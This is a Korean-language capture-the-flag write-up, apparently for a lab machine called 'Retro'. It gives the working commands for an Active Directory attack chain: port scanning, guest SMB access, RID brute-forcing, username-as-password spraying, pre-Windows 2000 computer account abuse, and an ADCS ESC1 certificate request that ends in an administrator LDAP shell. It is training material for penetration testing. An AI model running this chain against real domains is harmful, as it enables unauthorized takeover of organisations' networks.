# Retro
- [Port Scanning]
## Port Scanning
```bash
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49668,51977,51990,52005,56668,56677 -sC -sV -vv -oA retro 10.129.11.72
```
<img width="1205" height="268" alt="image" src="https://github.com/user-attachments/assets/9f187177-9813-4dd0-a458-6248c2d004b6" />
<img width="1205" height="196" alt="image" src="https://github.com/user-attachments/assets/f87d62fe-3c63-438b-8d3d-79d8f1f382bc" />
<img width="1205" height="172" alt="image" src="https://github.com/user-attachments/assets/4fd21ea6-9a9a-4ff6-afb4-41791e0f6862" />

- DNS
- KERBEROS
- LDAP
- SMB
- RDP

<br>

- `retro-DC-CA` 존재.
- `/etc/hosts`에 `dc.retro.vl` 추가.
<img width="1205" height="79" alt="image" src="https://github.com/user-attachments/assets/32aaa9e4-0134-48dd-9199-fb9ac5f01fae" />

## SMB
- guest login 성공.
```bash
nxc smb 10.129.11.72 -u guest -p ''
```
<img width="1205" height="133" alt="image" src="https://github.com/user-attachments/assets/f12be375-2551-4e64-a1e1-15cbced77e1c" />

<br>
<br>

- `rid-brute` 옵션으로 유저 수집.
```bash
nxc smb 10.129.11.72 -u guest -p '' --rid-brute|grep -i sidtypeuser
```
<img width="1205" height="255" alt="image" src="https://github.com/user-attachments/assets/4c3a209c-8422-4347-8f5c-61e0e0db18ad" />

<br>
<br>

- `/Trainees` 경로에 읽기 권한 확인.
```bash
nxc smb 10.129.11.72 -u guest -p '' --shares
```
<img width="1202" height="370" alt="image" src="https://github.com/user-attachments/assets/1ae6192c-00d3-4ab2-83d8-09db6cde59a2" />

<br>
<br>

- `/Trainees` 경로에 접속하여 `Important.txt` 다운로드.
```bash
smbclient -U guest //10.129.11.72/trainees
```
<img width="1202" height="319" alt="image" src="https://github.com/user-attachments/assets/a55b17d2-f45d-40b8-97b8-b76e074878cc" />

## Auth as trainee
- 특별한 정보를 발견할 수 없어 유저명과 동일하게 패스워드를 입력하여 로그인 시도.
- `trainee` 계정 로그인 성공.
```bash
nxc smb 10.129.11.72 -u users -p users --no-brute
```
<img width="1202" height="226" alt="image" src="https://github.com/user-attachments/assets/6d67c18b-dc90-46ff-9f07-fb124cf84f21" />

<br>
<br>

- `/Notes` 경로 읽기 권한 확인.
```bash
nxc smb 10.129.11.72 -u trainee -p trainee --shares
```
<img width="1202" height="375" alt="image" src="https://github.com/user-attachments/assets/bc0396d3-a8d8-4fc5-b918-da07de266df5" />

<br>
<br>

- `/Notes` 경로 내부 파일 다운로드.
```bash
smbclient -U trainee //10.129.11.72/notes
```
<img width="1202" height="395" alt="image" src="https://github.com/user-attachments/assets/c5c56d20-9f6b-41ae-bbc7-4a122ae1ecd5" />

## Auth as Banking$
- `ToDO.txt`를 보면 레거시 시스템 banking software를 삭제할 필요가 있다고 한다.
<img width="1202" height="284" alt="image" src="https://github.com/user-attachments/assets/b2d8bd7f-b295-4087-9eb8-44f026f3bf20" />

<br>
<br>

- `pre2k`는 Windows 2000 이전 시스템과의 호환성을 위해 만든 정책인데, 초기 생성 시 컴퓨터 이름과 동일한 임시 패스워드가 설정되거나 취약한 인증 기본값이 적용되는 특성이 있다.
- `nxc`의 `pre2k` 옵션을 사용하여 수집.
```bash
nxc ldap 10.129.11.72 -u trainee -p trainee -M pre2k
```
<img width="1202" height="284" alt="image" src="https://github.com/user-attachments/assets/dc5876e9-7fe4-4393-b1b7-ce01e9999e20" />

<br>
<br>

- Kerberos 인증으로 로그인 성공.
```bash
nxc smb 10.129.11.72 -u banking$ -p banking -k
```
<img width="1202" height="201" alt="image" src="https://github.com/user-attachments/assets/dcd8820f-8a24-452d-82a4-0919403e5160" />

## Shell as Administrator
- CA가 존재하여 `Banking$` 계정으로 취약한 템플릿 확인.
- 저장된 tgt를 옮겨와서 KRB5CCNAME으로 지정한 후 실행.
- `ESC1` 취약점 발견.
```bash
export KRB5CCNAME=./banking.ccache

certipy-ad find -u banking$ -k -target dc.retro.vl -text -stdout -vulnerable
```
<img width="1202" height="92" alt="image" src="https://github.com/user-attachments/assets/184f57f1-c432-43d8-b8bf-c0ab1cedbfff" />

<br>
<br>

- `administrator` 유저에게 인증서 요청.
- 공개키가 인증서 템플릿의 사이즈에 맞지 않다는 오류가 발생.
```bash
certipy-ad req -u banking$@retro.vl -k -dc-ip 10.129.11.72 -dc-host dc.retro.vl -target dc.retro.vl -ca 'retro-dc-ca' -template RetroClients -upn administrator@retro.vl -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
```
<img width="1202" height="325" alt="image" src="https://github.com/user-attachments/assets/d728b884-f7fd-4fdc-a41a-ddd99c724a97" />

<br>
<br>

- `key-size` 옵션을 사용하여 기존의 크기보다 2배를 증가 시켜서 실행.
```bash
certipy-ad req -u banking$@retro.vl -k -dc-ip 10.129.11.72 -dc-host dc.retro.vl -target dc.retro.vl -ca 'retro-dc-ca' -template RetroClients -upn administrator@retro.vl -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096
```
<img width="1202" height="303" alt="image" src="https://github.com/user-attachments/assets/d8d97fd1-50be-4fe9-b38c-32545e321373" />

<br>
<br>

- 인증서를 사용하여 인증을 시도했으나 KDC에서 인증서 로그인을 지원하지 않을 수 있어 `KDC_ERR_PADATA_TYPE_NOSUPP` 에러 발생.
<img width="1202" height="347" alt="image" src="https://github.com/user-attachments/assets/bea1e2b0-3e09-4a4e-a075-4ee753609e73" />

<br>
<br>

- `ldap-shell` 옵션을 사용하여 셸 획득.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.11.72 -ldap-shell
```
<img width="1202" height="344" alt="image" src="https://github.com/user-attachments/assets/15fa29c6-8f8d-4d0c-ade2-d194e38379d7" />
